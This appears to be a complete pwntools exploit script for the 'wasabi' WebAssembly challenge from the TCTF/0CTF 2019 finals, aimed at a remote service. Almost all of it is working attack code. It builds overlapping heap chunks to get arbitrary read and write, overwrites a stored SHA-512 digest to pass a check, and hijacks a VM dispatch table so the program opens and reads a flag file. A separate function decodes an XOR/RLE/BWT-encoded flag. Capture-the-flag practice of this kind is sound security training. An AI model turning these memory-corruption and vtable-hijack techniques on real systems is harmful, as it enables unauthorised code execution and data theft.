#!/usr/bin/env python
# encoding: utf-8

from pwn import *
from hashlib import sha512

#context.log_level = "debug"
context.terminal = "tmux split -v".split(" ")

binary = "./wasabi"
binary = "./wasmtime --dir=. ./wasabi.release".split(" ")
#r = process(binary)
r = remote("192.168.201.13", 2222)

#digest_addr = 0x1107a
digest_addr = 0x12131
#vtable_addr = 0x111c0
vtable_addr = 0x12320
regs_addr = 0x400 # 0xea0  # FIXME
memory_addr = 0x440+0x400 # 0xee0  # FIXME


def step1():
    target = "W3lc0me_t0_Sh4nGhai_0cTf/Tctf_2019_f1n4ls!"
    key = [0x77, 0x2, 0x9, 0x52, 0x40, 0x5c, 0x16, 0x6e, 0x19, 0x1, 0x26, 0x62, 0x37, 0x5, 0x6, 0x76, 0x6, 0x50, 0x36, 0x6d, 0x29, 0x52, 0x31, 0x57, 0x5f, 0x65, 0xa, 0x45, 0x13, 0x6e, 0x5e, 0x1, 0x6e, 0x8, 0x38, 0x57, 0x5d, 0x5f, 0x5c, 0x5d, 0x1, 0x10]
    assert len(target) == len(key)
    rle_target = ''.join([chr(ord(target[i]) ^ key[i]) for i in xrange(len(key))])
    print rle_target
    print rle_target.encode("hex")

    def decode_rle(s):
        rst = ""
        num = ""
        last_chr = ""
        for i in s:
            if not i.isdigit():
                if len(num) > 0:
                    assert len(last_chr) > 0
                    rst += last_chr * int(num)
                    num = ""
                last_chr = i
            else:
                num += i

        if len(last_chr) > 0 and len(num) > 0:
            rst += last_chr * int(num)
        return rst

    def decode_bwt(s):
        table = [""] * len(s)
        for i in xrange(len(s)):
            table = sorted(s[i] + table[i] for i in  xrange(len(s)))
        rst = [line for line in table if line.endswith("\x20")][0]
        return rst.rstrip("\x20").strip("\x19")

    bwt_target = decode_rle(rle_target)
    print bwt_target
    print bwt_target.encode("hex")

    flag = decode_bwt(bwt_target)
    print flag
    return flag


def add(content):
    r.sendline("1")

    r.recvuntil("Option content size:\n")
    r.sendline(str(len(content)))
    resp = r.recvline()
    if "Invalid" in resp:
        return
    assert resp == "Option content:\n"
    r.sendline(content)

def edit(idx, content):
    r.sendline("2")
    r.recvuntil("Option idx:\n")
    r.sendline(str(idx))

    resp = r.recvline()
    if "Invalid" in resp:
        return
    # send content size
    assert resp == "Option content size:\n"
    r.sendline(str(len(content)))

    resp = r.recvline()
    if "Invalid" in resp:
        return

    # send content
    assert resp == "New option content:\n"
    r.sendline(content)

def delete(idx):
    r.sendline("3")
    r.recvuntil("Option idx:\n")
    r.sendline(str(idx))


def first_flag():
    r.recvuntil("Do you like wasabi?\n")
    r.sendline("im_hungry_pls_help_e")
    r.recvuntil("Congraz and flag is flag{im_hungry_pls_help_e}\n")

def overlap():
    add("A"*0x20)
    add("B"*0x20)
    delete(6)
    add("C"*0x40)
    add("D"*0x40)
    add("E"*0x50)

    payload = flat(
        'F' * 0x44,
        0x4b + 0x20,
        'G' * 4
    )
    edit(7, payload)

    delete(8)

    r.sendline("1")
    r.recvuntil("Option content size:\n")
    r.sendline(str(0x58))
    r.recvuntil("Option content:\n")
    r.sendline("1"*4)

def write_anywhere(addr, content):
    # ------------------------------------------------------------------
    # Now we have arbitrary write with any size, and also arbitrary read
    # ------------------------------------------------------------------

    payload = flat(
        '1' * 0x44,
        0x23,  # chunk size
        0x1,  # inused
        0x8,  # rest
        0,    # reserved
        0xfffffff,  # func
        0x50,  # content_size
        addr   # content_ptr
    ) + '\x00'
    edit(9, payload)

    edit(8, content+'\x00')

def bypass_sha512():
    msg = "1234"
    digest = sha512(msg).digest()
    assert not '\n' in digest

    write_anywhere(digest_addr, digest)

    r.sendline("4")
    r.sendline(msg)
    r.recvuntil("So u like this flavor, right? ")
    flag2 = r.recvline()
    print flag2

def write_vtable():
    maps = {
        "add" : 11,
        "sub" : 12,
        "mul" : 13,
        "div" : 14,
        "mod" : 15,
        "nor" : 16,
        "mov" : 17,
        "exchange" : 18,
        "li"  : 19,
        "load": 20,
        "store" : 21,
        "jmp" : 22,
        "jmpcond" : 23,
        "cmp" : 24,
        "_open" : 25,
        "_read" : 26,
        "_write": 27,
        "_close": 28,
        "nop" : 29,
        "quit" : 30,
            }
    target_table = [
        maps["_write"], # add
        maps["sub"],
        maps["_open"],  # mul
        maps["div"],
        maps["mod"],
        maps["nor"],
        maps["nop"],   # mov
        maps["nop"],   # exchange
        maps["nop"],   # li
        maps["load"],
        maps["store"],
        maps["jmp"],
        maps["jmp"],   # jmpcond
        maps["_read"], # cmp
        maps["_open"],
        maps["_read"],
        maps["nop"],  # _write
    ]

    target_table_content = ''.join(map(p32, target_table))
    write_anywhere(vtable_addr, target_table_content)

def write_vm_context():
    expect_fd = 14

    regs = [expect_fd] * 32

    regs[1] = 1
    regs[2] = 0x400
    regs[4] = 0x400

    regs_content = ''.join(map(p16, regs))

    flag_name = "flag.wasabi"
    memory_content = flag_name

    write_anywhere(regs_addr, regs_content)
    write_anywhere(memory_addr, memory_content)

#gdb.attach(r)

def main():
    first_flag()

    overlap()
    write_vtable()
    write_vm_context()
    bypass_sha512()

    data = r.recv(0x100)
    data = data.replace("\x00", '')
    print data
    #r.interactive()
    r.close()


#step1()
main()
